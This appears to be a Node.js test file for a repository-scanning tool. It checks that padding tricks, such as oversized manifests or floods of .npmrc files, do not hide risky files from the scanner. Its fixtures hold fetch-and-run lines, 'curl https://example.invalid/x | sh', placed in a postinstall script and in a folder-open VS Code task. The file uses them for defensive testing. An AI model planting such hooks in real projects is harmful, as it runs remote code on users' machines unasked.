// NP-01: acquisition limits the repository author can reach on purpose (padding) must never end in "no signals".
// Fixtures in memory, written to a temp folder only for the local path; network always fake.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyze } from '../skills/repoflags/scripts/lib/analyze.mjs';
import { orderByPriority } from '../skills/repoflags/scripts/lib/acquire/select.mjs';
import { materialize } from './helpers/materialize.mjs';
import { buildGithubRoutes } from './helpers/github-routes.mjs';
import { osvRoutes, registryRoutes, composeFetch } from './helpers/intel-routes.mjs';

const forbid = async () => { throw new Error('network forbidden'); };
const noGh = async () => { throw Object.assign(new Error('x'), { code: 'ENOENT' }); };
const now = () => new Date('2026-11-01T00:00:00Z');
const SHA = 'b'.repeat(40);
const PKG = (pad) => `{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl https://example.invalid/x | sh"}${' '.repeat(pad)}}`;
const TASKS = JSON.stringify({ version: '2.0.0', tasks: [{ label: 'x', type: 'shell', command: 'curl https://example.invalid/x | sh', runOptions: { runOn: 'folderOpen' } }] });
const padded = (n) => Object.fromEntries(Array.from({ length: n }, (_, i) => [`pad/${String(i).padStart(4, '0')}/.npmrc`, 'save-exact=true\n']));
const brief = (r) => r.signals.map((s) => `${s.rule}/${s.severity}`).join(', ');

async function local(t, files, options = {}) {
  const { dir, cleanup } = await materialize(files);
  t.after(cleanup);
  return analyze(dir, { offline: true, ...options }, { fetch: forbid, execGh: noGh, env: {}, now });
}

async function remote(files, sizes = {}, options = {}) {
  const routes = buildGithubRoutes({ owner: 'fixture-owner', repo: 'fixture-repo', sha: SHA, files, sizes });
  const fetch = composeFetch([osvRoutes({}), registryRoutes({})], routes);
  return analyze('fixture-owner/fixture-repo', options, { fetch, execGh: noGh, env: {}, now });
}

function assertSkipped(r, kind) {
  const s = r.signals.find((x) => x.rule === 'limits-skipped-critical');
  assert.ok(s, `limits-skipped-critical missing in ${brief(r)}`);
  assert.equal(s.severity, 'medium');
  assert.match(s.evidence, new RegExp(kind));
  assert.equal(r.outcome, 'signals_found');
}

test('NP-01 probe a, local: package.json padded past maxFileBytes is a medium signal, not "no signals"', async (t) => {
  const r = await local(t, { 'package.json': PKG(1100000), '.npmrc': 'save-exact=true\n' });
  assert.ok(r.limits.reached.includes('maxFileBytes'));
  assertSkipped(r, 'manifest');
});

test('NP-01 probe b, local: 2000 .npmrc do not push .vscode/tasks.json out of maxFiles', async (t) => {
  const r = await local(t, { '.vscode/tasks.json': TASKS, ...padded(2000) });
  assert.ok(r.limits.reached.includes('maxFiles'));
  assert.ok(r.signals.some((s) => s.rule === 'editor-autorun' && s.severity === 'high'), brief(r));
  assertSkipped(r, 'npmrc');
});

test('NP-01 probe a, GitHub: oversized package.json in the tree is a medium signal', async () => {
  const r = await remote({ 'package.json': PKG(0), '.npmrc': 'save-exact=true\n' }, { 'package.json': 1100000 });
  assert.ok(r.limits.reached.includes('maxFileBytes'));
  assertSkipped(r, 'manifest');
});

test('NP-01 probe b, GitHub: .npmrc flooding under maxFiles still lets tasks.json through', async () => {
  const r = await remote({ '.vscode/tasks.json': TASKS, ...padded(150) }, {}, { limits: { maxFiles: 100 } });
  assert.ok(r.limits.reached.includes('maxFiles'));
  assert.ok(r.signals.some((s) => s.rule === 'editor-autorun' && s.severity === 'high'), brief(r));
  assertSkipped(r, 'npmrc');
});

test('orderByPriority: past the per-kind quota a kind drops below every other kind, shallow paths first', () => {
  const paths = [...Object.keys(padded(60)), '.npmrc', '.vscode/tasks.json', 'src/x.config.js'];
  const out = orderByPriority(paths, (p) => p);
  assert.equal(out[0], '.npmrc');
  assert.ok(out.indexOf('.vscode/tasks.json') <= 50, String(out.indexOf('.vscode/tasks.json')));
  assert.ok(out.indexOf('src/x.config.js') < out.indexOf('pad/0059/.npmrc'));
});

test('nothing skipped: no limits-skipped-critical signal', async (t) => {
  const r = await local(t, { 'package.json': '{"name":"x","version":"1.0.0"}', '.npmrc': 'save-exact=true\n' });
  assert.equal(r.signals.some((s) => s.rule === 'limits-skipped-critical'), false, brief(r));
});
